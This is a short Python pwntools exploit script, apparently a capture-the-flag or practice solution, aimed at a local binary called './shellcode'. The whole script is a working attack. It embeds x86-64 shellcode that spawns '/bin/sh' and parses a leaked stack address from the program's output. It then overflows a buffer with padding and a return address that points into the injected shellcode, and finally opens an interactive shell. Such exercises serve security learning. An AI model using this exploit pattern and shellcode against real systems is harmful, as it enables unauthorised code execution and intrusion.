# -*- coding:utf-8 -*-
from pwn import *

# 22字节的shellcode
shellcode= b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" 

sh = process('./shellcode')
sh.recvuntil('[')
buf_addr = sh.recvuntil(']',drop=True)   
target_addr = int(buf_addr,16) + 24 + 8  
sh.sendline(24* b'a'+p64(target_addr)+shellcode)
sh.interactive()
